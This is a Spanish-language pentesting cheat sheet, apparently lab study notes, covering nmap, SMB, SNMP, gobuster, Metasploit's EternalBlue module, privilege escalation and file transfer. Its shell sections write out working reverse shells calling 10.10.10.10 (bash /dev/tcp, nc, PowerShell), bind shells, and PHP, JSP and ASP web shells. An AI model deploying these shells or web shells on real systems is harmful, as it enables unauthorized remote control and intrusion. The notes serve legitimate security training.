# Hacking Notes

*Página para ir desarrollando apuntes de pentesting.*

## **Penetration Testing Process**

**1- Pre-Engagement
2- Information Gathering
3- Vulnerability Assessment**
*Post-Explotation
Explotation
Lateral Movement*
**4- Proof of concept
5- Post Engagement**

## **Comandos Primarios**

`tree` → para ver la estrcutura de una carpeta o directorio.

`netstat -rn` → para ver las interfaces de red.

 `netcat 10.10.10.10 22` → capturar informacion de un servicio con netcat.

## Puertos y Protocolos

| Port(s) | Protocol |
| --- | --- |
| 20/21 (TCP) | FTP |
| 22 (TCP) | SSH |
| 23 (TCP) | Telnet |
| 25 (TCP) | SMTP |
| 80 (TCP) | HTTP |
| 161 (TCP/UDP) | SNMP |
| 389 (TCP/UDP) | LDAP |
| 443 (TCP) | SSL/TLS (HTTPS) |
| 445 (TCP) | SMB |
| 3389 (TCP) | RDP |

## Vim

| Command | Description |
| --- | --- |
| x | Cut character |
| dw | Cut word |
| dd | Cut full line |
| yw | Copy word |
| yy | Copy full line |
| p | Paste |

## **Nmap**

`nmap 10.129.42.253` → Escaneo Basico.
`nmap -sV -sC -p- 10.129.42.253` → Escaneo un poco mas especifico donde -sC es para correr scripts -sV para obtener la version del servicio y -p- para escanear todos los puertos.

`/usr/share/nmap/scripts/` → Ruta de scripts de nmap.

`nmap -sC -sV -p21 10.129.42.253` → Escanear un puerto especifico.

`nmap --script smb-os-discovery.nse -p445 10.10.10.40` → Script al puerto 445.

`nmap -A -p445 10.129.42.253` → -A activa la deteccion del sistema operativo.

## FTP

`ftp -p 10.129.42.253` → Conectarse a un host.

## SMB

`smbclient -N -L \\\\10.129.42.253` → Mapeo basico de SMB.

`smbclient \\\\10.129.42.253\\users` → Acceder a un recurso especifico.

`smbclient -U bob \\\\10.129.42.253\\users` → Teniendo un usuario valido.

## SNMP

`snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` → Comando basico de reconocimiento.

`snmpwalk -v 2c -c private  10.129.42.253`

`onesixtyone -c dict.txt 10.129.42.254` → Para efectuar un ataque de fuerza bruta.

## Gobuster

`gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` → Escaneo de directorios web.

`gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` → Escaneo servidores dns.

## Curl

`curl -IL https://www.inlanefreight.com` → Extraer informacion de una url -I para cabeceras y -L para que siga el redireccionamiento.

`curl http://SERVER_IP:PORT/shell.php?cmd=id` → Obtendremos el resultado del comando.

## Whatweb

`whatweb 10.10.10.121`

`whatweb --no-errors 10.10.10.0/24`

***Nota: Es importante revisar los certificados TLS y revisar el archivo robots.txt***

## ExploitDB

`searchsploit openssh 7.2` → Buscar exploit de un serivicio.

## Metasploit

`msfconsole` → Ejecutar metasploit.

`search exploit eternalblue` → Buscar exploit.

`use exploit/windows/smb/ms17_010_psexec` → Para usarlo.

`show options` → Para ver las opciones.

`check` → Para verificar que este todo correcto.

`exploit` → Correr exploit.

## **Reverse Shell**

`nc -lvnp 1234` → Ponerse en  escuhca.

| Flag | Description |
| --- | --- |
| -l | Listen mode, to wait for a connection to connect to us. |
| -v | Verbose mode, so that we know when we receive a connection. |
| -n | Disable DNS resolution and only connect from/to IPs, to speed up the connection. |
| -p 1234 | Port number netcat is listening on, and the reverse connection should be sent to. |

**Bash**

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

**Powershell**

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

## **Bind Shell**

**Bash**

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

**Python**

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

**Powershell**

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

## **Upgrading TTY**

1. `python -c 'import pty; pty.spawn("/bin/bash")'` → Luego 👇

```
www-data@remotehost$ ^Z
brailrnz@htb[/htb]$ stty raw -echo
brailrnz@htb[/htb]$ fg
[Enter]
[Enter]
www-data@remotehost$
```

**Types of Shells**

```
**brailrnz@htb[/htb]$ echo $TERM
xterm-256color**
```

**Types of Shells**

```
**brailrnz@htb[/htb]$ stty 
size 67 rows 318**
```

```
www-data@remotehost$ export TERM=xterm-256color
www-data@remotehost$ stty rows 67 columns 318
```

## **Web Shell**

**PHP**

```php
**<?php system($_REQUEST["cmd"]); ?>**
```

**Bash**

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

**JSP**

```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

**ASP**

```
<% eval request("cmd") %>
```

## **Rutas**

| Web Server | Default Webroot |
| --- | --- |
| Apache | /var/www/html/ |
| Nginx | /usr/local/nginx/html/ |
| IIS | c:\inetpub\wwwroot\ |
| XAMPP | C:\xampp\htdocs\ |

## **Privilege Escalation**

`./linpeas.sh` → Script de enumeración.

 `sudo -l` → Para ver que podemos ejecutar con privilegios sudo.

`sudo su -` → Elevar Privilegios.

**Scheduled Tasks**

1. `/etc/crontab`
2. `/etc/cron.d`
3. `/var/spool/cron/crontabs/root`

## **Transferring File**

### **wget**

`python3 -m http.server 8000` → Servidor python en la carpeta que se encuentra el archivo.

`wget http://10.10.14.1:8000/linenum.sh`

### curl

`curl http://10.10.14.1:8000/linenum.sh -o linenum.sh`

**SCP**

`scp linenum.sh user@remotehost:/tmp/linenum.sh`

`scp -P 49191 linpeas.sh user1@94.237.62.1:/tmp` → Si existe un puerto especifico.

### **Base64**

`base64 shell -w 0` → copie esta cadena base64, vaya al host remoto y use base64 -d para decodificarla y canalice la salida a un archivo.

`echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell`

`file shell` → validar archivo.

### md5sum

```
brailrnz@htb[/htb]$ md5sum shell
321de1d7e7c3735838890a72c9ae7d1d shell

user@remotehost$ md5sum shell
321de1d7e7c3735838890a72c9ae7d1d shell
```